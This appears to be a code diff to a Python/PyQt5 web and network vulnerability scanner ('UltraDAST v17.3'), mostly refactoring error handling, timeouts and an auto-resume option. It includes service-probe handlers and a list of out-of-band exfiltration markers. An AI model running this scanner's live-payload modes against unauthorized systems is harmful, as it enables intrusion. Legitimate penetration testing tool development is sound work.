+                    callback=lambda t: self.log(f"Validation completed for {vuln['type']}")
+                )
                 self.validation_tasks.add(task)
-                task.add_done_callback(self.validation_tasks.discard)
                 vuln['validation_pending'] = True
                 self.log(f"[VALIDATING] {vuln['type']} ({vuln.get('confidence')}%): {vuln['url']} [{vuln.get('parameter','')}]")
             except Exception as e:
@@ -28681,8 +32964,10 @@ class GraphQLSelfReferencingFragmentGenerator:
         self.log(f"[+] {vuln['type']} ({vuln.get('confidence')}%): {vuln['url']} [{vuln.get('parameter','')}]")
         self.add_finding(vuln)
         if vuln.get('severity') in ('Critical','High'):
-            asyncio.ensure_future(self.send_slack_alert(vuln))
-            asyncio.ensure_future(self.send_jira_alert(vuln))
+            slack_task = asyncio.ensure_future(self.send_slack_alert(vuln))
+            slack_task.add_done_callback(lambda t: logging.error(f"Slack alert failed: {t.exception()}") if t.exception() else None)
+            jira_task = asyncio.ensure_future(self.send_jira_alert(vuln))
+            jira_task.add_done_callback(lambda t: logging.error(f"JIRA alert failed: {t.exception()}") if t.exception() else None)
     async def _validate_vulnerability(self, vuln):
         try:
             if not self.validation_engine:
@@ -28718,7 +33003,7 @@ class GraphQLSelfReferencingFragmentGenerator:
         try:
             resp = await self.session_manager.fetch(
                 url, method=method, data=data, json_data=json_data,
-                headers=headers, allow_redirects=False, use_cache=use_cache,
+                headers=headers, allow_redirects=True, use_cache=use_cache,
                 session_manager=session_manager, session_id=session_id, cookies=cookies
             )
             if resp:
@@ -28727,8 +33012,11 @@ class GraphQLSelfReferencingFragmentGenerator:
                 resp._elapsed = getattr(resp, '_elapsed', 0)
                 return resp
             return None
+        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+            logging.debug(f"Network error during async fetch for {url}: {e}")
+            return None
         except Exception as e:
-            logging.debug(f"Async fetch error for {url}: {e}")
+            logging.debug(f"Unexpected error during async fetch for {url}: {e}", exc_info=True)
             return None
 
     async def test_jwts(self):
@@ -29699,7 +33987,7 @@ class SubdomainDiscovery:
                         async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                             if resp.status == 200:
                                 text = await resp.text()
-                                soup = BeautifulSoup(text, 'html.parser')
+                                soup = get_cached_soup(text, 'html.parser')
                                 
                                 # Extract subdomains from links
                                 for link in soup.find_all('a', href=True):
@@ -29740,8 +34028,7 @@ class SubdomainDiscovery:
                                 
                                 # Parse sitemap.xml
                                 if 'sitemap.xml' in url:
-                                    from bs4 import BeautifulSoup
-                                    soup = BeautifulSoup(text, 'xml')
+                                    soup = get_cached_soup(text, 'xml')
                                     for loc in soup.find_all('loc'):
                                         url_text = loc.text
                                         parsed = urlparse(url_text)
@@ -29793,6 +34080,13 @@ class SubdomainDiscovery:
     def log(self, msg):
         """Log message."""
         logging.info(msg)
+
+    def close(self):
+        """Clean up resources to prevent resource leaks."""
+        # SubdomainDiscovery uses ephemeral ClientSessions with context managers
+        # This method is provided for consistency with other cleanup patterns
+        self.discovered_subdomains.clear()
+        logging.info("SubdomainDiscovery: Resources cleaned up")
     
     async def scan_ports(self, host, ports, timeout=2):
         """Scan ports on a host to check if they are open."""
@@ -29921,7 +34215,7 @@ class SubdomainDiscovery:
         
         return open_ports
     
-    async def _handle_ssh(self, host, port=22, timeout=5):
+    async def _handle_ssh(self, host, port=22, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Handle SSH-specific scanning using asyncssh.
         
@@ -30181,7 +34475,7 @@ class SubdomainDiscovery:
         
         return ssh_findings
 
-    async def _handle_redis(self, host, port=6379, timeout=5):
+    async def _handle_redis(self, host, port=6379, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Handle Redis-specific scanning using redis.asyncio.
 
@@ -30298,7 +34592,7 @@ class SubdomainDiscovery:
 
         return redis_findings
 
-    async def _handle_mysql(self, host, port=3306, timeout=5):
+    async def _handle_mysql(self, host, port=3306, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Handle MySQL-specific scanning using aiomysql.
 
@@ -30460,7 +34754,7 @@ class SubdomainDiscovery:
 
         return mysql_findings
 
-    async def _handle_postgres(self, host, port=5432, timeout=5):
+    async def _handle_postgres(self, host, port=5432, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Handle PostgreSQL-specific scanning using asyncpg.
 
@@ -30622,7 +34916,7 @@ class SubdomainDiscovery:
 
         return postgres_findings
 
-    async def _handle_rdp(self, host, port=3389, timeout=5):
+    async def _handle_rdp(self, host, port=3389, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Handle RDP-specific scanning using raw sockets with X.224 protocol.
 
@@ -30969,7 +35263,7 @@ class SubdomainDiscovery:
 
         return None
 
-    async def _handle_smb(self, host, port=445, timeout=5):
+    async def _handle_smb(self, host, port=445, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Handle SMB-specific scanning using impacket raw structures.
 
@@ -31085,6 +35379,8 @@ class SubdomainDiscovery:
         Returns:
             bytes: Raw SMB negotiation request packet
         """
+        import struct
+        
         # NetBIOS Session Service header
         # Message Type: Session Message (0x00)
         # Length: follows
@@ -31400,7 +35696,7 @@ class SubdomainDiscovery:
             logging.debug(f"Error detecting SMB version: {e}")
             return None
 
-    async def _handle_mongodb(self, host, port=27017, timeout=5):
+    async def _handle_mongodb(self, host, port=27017, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Handle MongoDB-specific scanning using motor.
 
@@ -31571,8 +35867,12 @@ class ScannerWorker(QThread):
             })
         except Exception as e:
             import traceback
-            error_details = f"Scan error: {e}\n"
-            error_details += traceback.format_exc()
+            error_details = f"Scan error for target: {self.target}\n\n"
+            error_details += f"Exception Type: {type(e).__name__}\n"
+            error_details += f"Error Message: {str(e)}\n"
+            error_details += f"Timestamp: {datetime.now().isoformat()}\n"
+            error_details += f"Target URL: {self.target}\n\n"
+            error_details += "Stack Trace:\n" + traceback.format_exc()
             self.log.emit(error_details)
             
             # Emit finished even on error
@@ -31955,7 +36255,16 @@ class ProxyTab(QWidget):
                 self.start_proxy_btn.setText("Stop Proxy")
                 self.status_label.setText("Proxy running on port %d" % self.port_spin.value())
             else:
-                QMessageBox.warning(self, "Proxy Error", "Failed to start proxy")
+                import traceback
+                error_details = f"Failed to start proxy on port {self.port_spin.value()}\n\n"
+                error_details += f"Exception Type: ProxyStartupError\n"
+                error_details += f"Error Message: Proxy handler failed to initialize\n"
+                error_details += f"Timestamp: {datetime.now().isoformat()}\n\n"
+                error_details += "Possible causes:\n"
+                error_details += "- Port already in use\n"
+                error_details += "- Insufficient permissions\n"
+                error_details += "- Network configuration issue\n"
+                QMessageBox.warning(self, "Proxy Error", error_details)
         else:
             if self.proxy_handler:
                 self.proxy_handler.stop()
@@ -32716,7 +37025,7 @@ class RepeaterTab(QWidget):
                         async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                             if resp.status == 200:
                                 html = await resp.text()
-                                soup = BeautifulSoup(html, 'html.parser')
+                                soup = get_cached_soup(html, 'html.parser')
                                 
                                 csrf_tokens = {}
                                 csrf_field_names = [
@@ -32925,6 +37234,11 @@ class ScanTab(QWidget):
         self.dry_run_check = QCheckBox("Dry Run Mode (Print payloads without sending)")
         self.dry_run_check.setChecked(False)
         safety_layout.addWidget(self.dry_run_check)
+        
+        # Auto Resume Mode
+        self.auto_resume_check = QCheckBox("Auto Resume Mode (Automatically resume from most recent checkpoint)")
+        self.auto_resume_check.setChecked(False)
+        safety_layout.addWidget(self.auto_resume_check)
         
         # Safety Description
         safety_info = QLabel(
@@ -33262,7 +37576,7 @@ class ScanTab(QWidget):
         layout.addWidget(main_splitter)
         
         self.worker = None
-        self.fp_db = FP_Database()
+        self.fp_db = FP_Database(config={})
         self.total_tasks = 0
         self.current_task = 0
     
@@ -33382,20 +37696,25 @@ class ScanTab(QWidget):
             },
             # Safety Controls from GUI
             'maturity_level': self.maturity_combo.currentIndex(),
-            'dry_run': self.dry_run_check.isChecked()
+            'dry_run': self.dry_run_check.isChecked(),
+            'auto_resume': self.auto_resume_check.isChecked()
         }
         
         # Update global safety config with GUI settings
         global SAFETY_CONFIG
         SAFETY_CONFIG['maturity_level'] = config['maturity_level']
         SAFETY_CONFIG['dry_run'] = config['dry_run']
+        SAFETY_CONFIG['auto_resume'] = config['auto_resume']
         
         # Log safety configuration
         maturity_level = config['maturity_level']
         dry_run = config['dry_run']
+        auto_resume = config['auto_resume']
         self.log_area.append(f"[SAFETY] Maturity Level: {maturity_level} ({get_maturity_level_name(maturity_level)})")
         if dry_run:
             self.log_area.append("[SAFETY] DRY-RUN MODE ENABLED - No payloads will be sent")
+        if auto_resume:
+            self.log_area.append("[SAFETY] AUTO-RESUME MODE ENABLED - Will automatically resume from most recent checkpoint")
         
         self.worker = ScannerWorker(target, config)
         self.worker.log.connect(self.log_area.append)
@@ -33419,10 +37738,13 @@ class ScanTab(QWidget):
         # Display safety status in log area
         maturity_level = config['maturity_level']
         dry_run = config['dry_run']
+        auto_resume = config['auto_resume']
         self.log_area.append(f"[SAFETY] Operating at Maturity Level {maturity_level}: {get_maturity_level_name(maturity_level)}")
         if dry_run:
             self.log_area.append("[SAFETY] DRY-RUN MODE: Payloads will be printed but not sent")
-        else:
+        if auto_resume:
+            self.log_area.append("[SAFETY] AUTO-RESUME MODE: Will automatically resume from most recent checkpoint")
+        if not dry_run:
             self.log_area.append("[SAFETY] LIVE MODE: Payloads will be sent to target")
     def stop_scan(self):
         if self.worker and self.worker.isRunning():
@@ -33665,7 +37987,7 @@ class ScanTab(QWidget):
 class MainWindow(QMainWindow):
     def __init__(self):
         QMainWindow.__init__(self)
-        self.setWindowTitle("UltraDAST v17.0 – Unstoppable Pentester")
+        self.setWindowTitle("UltraDAST v17.3 – Unstoppable Pentester")
         self.resize(1600, 1000)
         # Set reasonable minimum size constraints (no maximum for full adjustability)
         self.setMinimumSize(1200, 800)
@@ -34748,7 +39070,7 @@ class MainWindow(QMainWindow):
                         ['Low', str(severity_counts['Low'])],
                         ['Info', str(severity_counts['Info'])],
                         ['Scan Date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
-                        ['Tool Version', 'UltraDAST v17.0']
+                        ['Tool Version', 'UltraDAST v17.3']
                     ]
                     summary_table = Table(summary_data, colWidths=[2*inch, 2*inch])
                     summary_table.setStyle(TableStyle([
@@ -34859,7 +39181,7 @@ class MainWindow(QMainWindow):
                     report = {
                         "scan_info": {
                             "timestamp": datetime.now().isoformat(),
-                            "tool": "UltraDAST v17.0",
+                            "tool": "UltraDAST v17.3",
                             "total_findings": current_tab.findings_table.rowCount()
                         },
                         "vulnerabilities": []
@@ -34938,7 +39260,8 @@ class MainWindow(QMainWindow):
 # Global safety configuration
 SAFETY_CONFIG = {
     'dry_run': False,
-    'maturity_level': 3  # Default to Level 3 (Nuclear)
+    'maturity_level': 3,  # Default to Level 3 (Nuclear)
+    'auto_resume': False  # Default to not auto-resume
 }
 
 def get_maturity_level_name(level):
@@ -34985,7 +39308,7 @@ class ReconnaissanceMaturityModel:
     
     OOB_PATTERNS = [
         'OOB_MARKER', 'DNS_EXFIL', 'HTTP_EXFIL', 'SMB_EXFIL',
-        'burpcollaborator', 'interactsh', 'canarytokens'
+        'burpcollaborator', 'canarytokens'
     ]
     
     RACE_CONDITION_PATTERNS = [
@@ -35140,7 +39463,7 @@ def main():
         
         # Parse command-line arguments for safety controls
         parser = argparse.ArgumentParser(
-            description='ULTRA-DAST v17.0 - Advanced Security Scanner with Safety Controls',
+            description='ULTRA-DAST v17.3 - Advanced Security Scanner with Safety Controls',
             formatter_class=argparse.RawDescriptionHelpFormatter,
             epilog="""
 Reconnaissance Maturity Model:
@@ -35170,20 +39493,30 @@ Examples:
             help='Reconnaissance Maturity Model level (0-3). Default: 3 (Nuclear). Lower levels are safer.'
         )
         
+        parser.add_argument(
+            '--auto-resume',
+            action='store_true',
+            help='Automatically resume from the most recent checkpoint if available.'
+        )
+        
         args = parser.parse_args()
         
         # Store safety settings in global config for access throughout the application
         global SAFETY_CONFIG
         SAFETY_CONFIG = {
             'dry_run': args.dry_run,
-            'maturity_level': args.maturity_level
+            'maturity_level': args.maturity_level,
+            'auto_resume': args.auto_resume
         }
         
         if args.dry_run:
             print("[SAFETY] DRY-RUN MODE ENABLED - No payloads will be sent")
         print(f"[SAFETY] MATURITY LEVEL: {args.maturity_level} ({get_maturity_level_name(args.maturity_level)})")
+        if args.auto_resume:
+            print("[SAFETY] AUTO-RESUME MODE ENABLED - Will automatically resume from most recent checkpoint")
         
         # Increase recursion limit temporarily to help debug
+        # Note: This is intentionally lower than RECURSION_LIMIT for GUI debugging
         sys.setrecursionlimit(2000)
         from PyQt5.QtWidgets import QApplication
         app = QApplication(sys.argv)
